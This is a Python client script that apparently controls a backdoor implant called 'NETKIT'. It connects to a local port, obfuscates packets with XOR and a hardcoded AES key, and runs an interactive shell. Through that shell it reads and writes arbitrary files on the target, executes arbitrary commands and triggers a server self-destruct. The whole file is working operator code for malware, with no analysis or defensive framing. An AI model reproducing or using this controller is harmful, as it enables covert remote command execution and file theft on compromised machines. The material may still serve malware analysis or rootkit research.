#!/usr/bin/env python3

from pwn import p8, xor
import socket
from Crypto.Cipher import AES
import time
import os


AUTH_PASSWORD = 0

CMD_FILE_READ = 0
CMD_FILE_WRITE = 1
CMD_FILE_EXEC = 2
CMD_PROXY = 3
CMD_EXIT = 4


class PacketReq:
    def __init__(self, auth_id: int, password: bytes, cmd_id: int, content: bytes):
        self.auth_id = auth_id
        self.password = password
        self.cmd_id = cmd_id
        self.content = content

    def __bytes__(self):
        return p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content


class PacketRes:
    def __init__(self, data: bytes):
        self.retv = int.from_bytes(data[:4], 'little', signed=True)
        self.domain = data[4]
        self.content = data[5:]


def sendrecv(sendbuf: bytes) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 8008))

    print = lambda *x: ...

    data = sendbuf
    print('\nsend:', data)

    data = xor(data, b"NETKIT_XOR")[:len(data)]
    print('\nxor:', data)

    padlen = 16-(len(data) % 16)
    if padlen == 16:
        padlen = 0

    data += padlen.to_bytes(1, 'little') * padlen
    print(f'\npad: {data} ({len(data)-padlen})')

    iv = b"IV"*8
    cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
    data = iv + cipher.encrypt(data)
    print('\naes:', data)

    start = time.perf_counter()
    s.sendall(data)
    data = s.recv(1024)
    end = time.perf_counter()
    s.close()

    print(f"time: {(end - start) * 1000}ms")

    print("\n==========")
    print('recv:', repr(data))
    cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, data[:16])
    pad = cipher.decrypt(data[16:])
    data = pad[:-ord(pad[len(pad)-1:])]
    print('\naes:', data)

    data = xor(data, b"NETKIT_XOR")[:len(data)]
    print('\nxor:',  data)

    return data


def download(password: bytes, filename: str):
    packet = PacketReq(0, password, CMD_FILE_READ, filename.encode())

    rsp = PacketRes(sendrecv(bytes(packet)))
    if rsp.retv < 0:
        print(f"[-] failed to download file '{filename}' from server")
        return

    filename_flat = filename.replace("/", "__")
    with open(filename_flat, "wb") as f:
        f.write(rsp.content)

    print(f"[+] file successfully downloaded '{filename}' as '{filename_flat}'")


def upload(password: bytes, filename_local: str, filename_remote: str):
    with open(filename_local, "rb") as f:
        content = f.read()

    packet = PacketReq(0, password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)

    rsp = PacketRes(sendrecv(bytes(packet)))
    if rsp.retv < 0:
        print(f"[-] failed to upload file '{filename_local}' to the server as '{filename_remote}'")
        return

    print(f"[+] successfully uploaded file '{filename_local}' as '{filename_remote}' to server")


def exec(password: bytes, pwd: str, cmd: str):
    packet = PacketReq(0, password, CMD_FILE_EXEC, f"cd {pwd} && {cmd}".encode())

    rsp = PacketRes(sendrecv(bytes(packet)))
    if rsp.retv == 0x7f00:
        print(f"command not found (something went wrong): {cmd.split(' ')[0]}")
        return
    elif rsp.retv != 0:
        print(f"retv: {rsp.retv}, domain: {rsp.domain}")

    print(rsp.content.decode())


def server_exit(password):
    packet = PacketReq(0, password, CMD_EXIT, b"")

    sendrecv(bytes(packet))
    print("[+] successfully self-destructed the server")


def main():
    password = b"passwoard"
    pwd = os.path.abspath("/")
    while True:
        argv = input("$ ").lower().strip(" ").split(" ")
        if argv[0] == "download":
            download(password, argv[1])
        elif argv[0] == "upload":
            upload(password, argv[1], argv[2])
        elif argv[0] == "[self-destruct]":
            server_exit(password)
            break
        elif argv[0] == "cd":
            pwd = os.path.normpath(os.path.join(pwd, argv[1]))
        elif argv[0] == "exit":
            break
        elif argv[0] == '' and len(argv) == 1:
            continue
        else:
            exec(password, pwd, ' '.join(argv))


if __name__ == "__main__":
    main()
